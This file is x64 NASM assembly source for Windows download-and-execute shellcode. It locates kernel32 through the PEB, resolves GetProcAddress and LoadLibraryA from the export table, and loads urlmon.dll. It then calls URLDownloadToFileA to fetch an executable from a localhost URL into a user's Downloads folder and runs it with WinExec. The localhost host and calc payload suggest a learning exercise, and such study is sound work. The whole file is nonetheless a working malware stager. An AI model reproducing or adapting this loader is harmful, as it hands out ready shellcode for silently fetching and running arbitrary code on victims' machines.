; Using NASM
global main

section .text

main:
    ; Declaring the entry point
    ;int3
    push rbp ; saving the previous base pointer
    mov rbp, rsp
    sub rsp, 78h ; making space for stack
    ;finding kernel32.dll base address
    mov rax, [gs:60h]
    mov rax, [rax+18h]
    mov rax, [rax+20h]
    mov rax, [rax]
    mov rax, [rax]
    mov rax, [rax+20h] ;here we got address of Kernel32.dll in rax register
    mov [rbp-8h], rax
    ;add rsp, 38h
    ;int3

    mov ebx, [rax+3ch] ; rbx have RVA of Nt Header
    add rbx, rax ; rbx have VA of Nt Header
    mov ebx, [rbx+88h] ; ebx have RVA of Export Directory
    ;add rsp, 38h
    add rbx, rax ; rbx have VA of Export Directory
    xor r8, r8
    mov r8d, [rbx+20h] ; r8d have RVA of function's name address table
    add r8, rax ; r8 have VA of function's name address table
    mov rsi, 41636f7250746547h
    xor r9, r9

    loop:
    xor r10, r10
    inc r9
    mov r10d, [r8 + r9*4] ; r10 have RVA of function name
    add r10, rax ; r10 have VA of function name
    cmp  [r10], rsi
    jnz loop ; loop ends. After the loop there will be address of GetProcAddress in r10 register
    xor r10, r10
    mov r10d, [rbx+24h] ; r10d contains the RAV of ordinal table
    add r10, rax  ; r10 contain the VA of ordinal table
    ;mov r11d,[r10 + r9*2] ; r11d will have ordinal number of function
    mov r12d, [rbx+1ch] ; RVA of function's address table
    add r12, [rbp-8h] ; VA of function's address table
    mov r13d, [r12 + r9*4]
    add r13, [rbp-8h] ; VA of GetProcAddress
    mov [rbp-10h], r13 ; saving address of GetProcAddress in stack

    ; now r8-r13 are of no use 


    ;LoadLibraryA  -->  4C 6F 61 64 4C 69 62 72 61 72 79 41
    ;Kernel32  -->  6B 65 72 6E 65 6C 33 32
    ; Using GetProcAddress we will find the address of LoadLibraryA function inside kernel32 
    ; For this we will need address of kernel32.dll and pointer to string containing function address
    
    ; setting up arguments
    mov rcx, [rbp-8h] 
    mov edx, 41797261h
    push rdx
    mov rdx, 7262694c64616f4ch
    push rdx
    mov rdx, rsp
    sub rsp, 30h
    call [rbp-10h] ; calling GetProcAddress
    add rsp, 30h
    add rsp, 10h
    mov [rbp-18h], rax ; [rbp-18h] address of function LoadLibraryA 


    ; parameter to LoadLibraryA will be "C;\Winodws\System32\urlmon.dll" -->  
    ;43 3B 5C 57 69 6E 64 6F
    ;77 73 5C 53 79 73 74 65
    ;6D 33 32 5C 75 72 6C 6D 
    ;6F 6E 2E 64 6C 6C
    ;xor rcx,rcx
    mov rcx, 00006c6c642e6e6fh
    push rcx
    mov rcx, 6d6c72755c32336dh
    push rcx
    mov rcx, 65747379535c7377h
    push rcx
    mov rcx, 6f646e69575c3a43h
    push rcx
    mov rcx, rsp
    sub rsp, 10h
    and rsp, 0FFFFFFFFFFFFFFF0h ; align stack to multiple of 16 bytes
    call [rbp-18h]
    add rsp, 10h
    add rsp, 20h
    mov [rbp-20h], rax ; got the address of urlmon.dll

    
    mov rcx, rax ; setting up the first argument (address of urlmon.dll)
    ;setting up second argument
    ;URLDownloadToFile -->  55 52 4C 44 6F 77 6E 6C 6F 61 64 54 6F 46 69 6C 65
    xor rdx, rdx
    mov dx, 4165h
    push rdx
    mov rdx, 6c69466f5464616fh
    push rdx
    mov rdx, 6c6e776f444c5255h
    push rdx
    mov rdx, rsp
    sub rsp, 30h
    call [rbp-10h] ; calling GetProcAddress
    add rsp, 30h
    add rsp, 10h
    mov [rbp-28h], rax ; [rbp-18h] address of function URLDownloadToFile

    ;first argument
    xor rcx,rcx
    ;second argument --> http://localhost:8000/folder/calc.EXE
    ;68 74 74 70 3A 2F 2F 6C 6F 63 61 6C 68 6F 73 74 3A 38 30 30 30 2F 66 6F 6C 64 65 72 2F      63 61 63 6C 2E 45 58 45
     mov rdx, 4558452e63h
    push rdx
    mov rdx, 6c61632f7265646ch
    push rdx
    mov rdx, 6f662f303030383ah
    push rdx
    mov rdx, 74736f686c61636fh
    push rdx
    mov rdx, 6c2f2f3a70747468h
    push rdx
    mov rdx, rsp
    ;third argument
    ;C:\Users\AV\Downloads\file.exe -->  43 3A 5C 55 73 65 72 73 5C 41 56 5C 44 6F 77 6E 6C 6F 61 64 73 5C 66 69 6C 65 2E 65 78 65  
    mov r8, 006578652e656ch
    push r8
    mov r8, 69665c7364616f6ch
    push r8
    mov r8, 6e776f445c56415ch
    push r8
    mov r8, 73726573555c3a43h
    push r8
    mov r8, rsp
    xor r9, r9
    add rsp, 48h
    sub rsp, 70h
    and rsp, 0FFFFFFFFFFFFFFF0h ; align stack to multiple of 16 bytes
    xor r10, r10
    mov [rsp+20h] , r10
    ;call [rbp-28h] ; calling URLDownloadToFile
    call rax
    add rsp, 70h

    ;WinExec  -->  57 69 6E 45 78 65 63
    ;Kernel32  -->  6B 65 72 6E 65 6C 33 32
    ; Using GetProcAddress we will find the address of LoadLibraryA function inside kernel32 
    ; For this we will need address of kernel32.dll and pointer to string containing function address
    
    ; setting up arguments
    mov rcx, [rbp-8h] 
    mov rdx, 636578456e6957h
    push rdx
    mov rdx, rsp
    sub rsp, 30h
    call [rbp-10h] ; calling GetProcAddress
    add rsp, 30h
    add rsp, 8h
    mov [rbp-30h], rax ; [rbp-18h] address of function WinExec 

    mov rcx, 006578652e656ch
    push rcx
    mov rcx, 69665c7364616f6ch
    push rcx
    mov rcx, 6e776f445c56415ch
    push rcx
    mov rcx, 73726573555c3a43h
    push rcx
    mov rcx, rsp
    mov rdx, $10
    sub rsp, 28h
    and rsp, 0FFFFFFFFFFFFFFF0h ; align stack to multiple of 16 bytes
    call rax ; calling WinExec
    add rsp, 28h

    ret

 

